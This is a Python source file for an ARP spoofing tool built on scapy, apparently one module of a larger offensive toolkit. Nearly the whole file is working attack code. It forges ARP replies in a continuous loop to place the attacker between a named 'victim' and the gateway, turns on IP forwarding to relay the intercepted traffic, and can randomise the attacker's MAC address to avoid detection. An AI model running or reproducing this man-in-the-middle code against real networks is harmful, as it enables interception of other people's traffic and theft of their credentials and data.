# File: core/arp_spoofer.py
from scapy.all import ARP, Ether, send, srp
import time
import os
from colorama import Fore, Style, init
from datetime import datetime
import random
from scapy.arch.windows import get_windows_if_list

init(autoreset=True)

# Enable IP forwarding (Linux only)
def enable_ip_forwarding():
    if os.name == "posix":
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        print(Fore.GREEN + "[+] IP Forwarding Enabled")
    else:
        print(Fore.YELLOW + "[!] IP Forwarding only supported on Linux")

# Get MAC address using ARP request
def get_mac(ip):
    """Get MAC address using ARP request with improved error handling and discovery."""
    try:
        # Create ARP request
        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
            pdst=ip,
            hwdst="ff:ff:ff:ff:ff:ff",
            op=1  # who-has (request)
        )
        
        # Send packet and wait for response with increased timeout
        for attempt in range(3):
            print(Fore.YELLOW + f"[*] Attempting to get MAC for {ip} (attempt {attempt + 1}/3)")
            answered, _ = srp(
                arp_request,
                timeout=5,
                verbose=False,
                retry=3,
                filter=f"arp and arp[7] = 2 and dst host {ip}"  # Only capture ARP replies
            )
            
            if answered:
                return answered[0][1].hwsrc
            
            time.sleep(1)  # Wait between attempts
        
        print(Fore.RED + f"[!] Failed to get MAC for {ip} after 3 attempts")
        return None
        
    except Exception as e:
        print(Fore.RED + f"[!] Error in get_mac for {ip}: {str(e)}")
        return None

# Get spoofed ARP packet
def spoof(target_ip, spoof_ip, target_mac=None):
    """Send spoofed ARP packet with fallback to broadcast."""
    try:
        # If no MAC provided, try to get it or use broadcast
        if not target_mac:
            target_mac = get_mac(target_ip) or "ff:ff:ff:ff:ff:ff"
            if target_mac == "ff:ff:ff:ff:ff:ff":
                print(Fore.YELLOW + f"[!] Using broadcast MAC for {target_ip}")
        
        # Create and send packet
        arp = ARP(
            op=2,  # is-at (response)
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip
        )
        
        # Create Ethernet frame
        ether = Ether(dst=target_mac)
        packet = ether/arp
        
        # Send with retry
        for _ in range(3):
            send(packet, verbose=False)
            time.sleep(0.1)  # Small delay between retries
            
        log_event(f"Sent ARP is-at to {target_ip} ({target_mac}) claiming {spoof_ip}")
        return True
        
    except Exception as e:
        print(Fore.RED + f"[!] Error spoofing {target_ip}: {str(e)}")
        return False

# Restore ARP tables
def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    if dest_mac and source_mac:
        packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        send(packet, count=4, verbose=False)
        print(Fore.YELLOW + f"[!] Restored ARP for {dest_ip}")

def get_default_iface():
    """Get the default network interface name for the current OS."""
    try:
        if os.name == "nt":  # Windows
            # Get all interfaces and find the active one
            ifaces = get_windows_if_list()
            for iface in ifaces:
                if iface.get('name', '').startswith(('Ethernet', 'Wi-Fi')):
                    return iface.get('name')
            return None
        else:  # Linux
            return "eth0"
    except Exception as e:
        print(Fore.RED + f"[!] Error getting default interface: {str(e)}")
        return None

# Randomize MAC address (Linux only)
def randomize_mac():
    """Randomize MAC address with proper interface detection."""
    if os.name == "posix":  # Only for Linux
        iface = get_default_iface()
        if not iface:
            print(Fore.RED + "[!] Could not determine default interface")
            return False
            
        mac = "02:00:%02x:%02x:%02x:%02x" % tuple(random.randint(0x00, 0x7f) for _ in range(4))
        os.system(f"ifconfig {iface} hw ether {mac}")
        print(Fore.CYAN + f"[+] MAC Address randomized to: {mac}")
        return True
    else:
        print(Fore.YELLOW + "[!] MAC randomization only supported on Linux")
        return False

# Log events to a file
def log_event(event):
    with open("megadriod_arp_log.txt", "a") as logfile:
        logfile.write(f"[{datetime.now()}] {event}\n")

# Start ARP spoofing loop
def start_spoof(victim_ip, gateway_ip, use_mac_random=False):
    """Start ARP spoofing with interface detection."""
    print(Fore.BLUE + f"[+] Launching ARP Spoof between {victim_ip} <-> {gateway_ip}")
    
    # Get default interface
    iface = get_default_iface()
    if not iface:
        print(Fore.RED + "[!] Could not determine default interface")
        return
    
    print(Fore.GREEN + f"[+] Using interface: {iface}")
    
    # Initial validation
    print(Fore.YELLOW + "[*] Validating targets...")
    
    # Try multiple times to get MACs
    for attempt in range(3):
        victim_mac = get_mac(victim_ip)
        gateway_mac = get_mac(gateway_ip)
        
        if victim_mac and gateway_mac:
            break
            
        print(Fore.YELLOW + f"[!] Retry {attempt + 1}/3: Waiting 5 seconds...")
        time.sleep(5)
    
    # Final validation check
    if not victim_mac:
        print(Fore.RED + f"[!] Could not resolve victim MAC address. Is {victim_ip} online?")
        print(Fore.YELLOW + "[*] Attempting broadcast mode...")
    
    if not gateway_mac:
        print(Fore.RED + f"[!] Could not resolve gateway MAC address. Is {gateway_ip} correct?")
        print(Fore.YELLOW + "[*] Attempting broadcast mode...")
    
    print(Fore.GREEN + "[+] Starting ARP spoofing")
    print(Fore.GREEN + f"[+] Victim: {victim_ip} ({victim_mac or 'broadcast'})")
    print(Fore.GREEN + f"[+] Gateway: {gateway_ip} ({gateway_mac or 'broadcast'})")
    
    if use_mac_random:
        randomize_mac()

    enable_ip_forwarding()
    
    try:
        while True:
            # Spoof both directions with proper MAC addresses
            success_v = spoof(victim_ip, gateway_ip, victim_mac)
            success_g = spoof(gateway_ip, victim_ip, gateway_mac)
            
            if not (success_v and success_g):
                print(Fore.YELLOW + "[!] Spoofing failed, retrying in 5 seconds...")
                time.sleep(5)
            else:
                time.sleep(2)
                
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Interrupt detected. Restoring ARP...")
        restore(victim_ip, gateway_ip)
        restore(gateway_ip, victim_ip)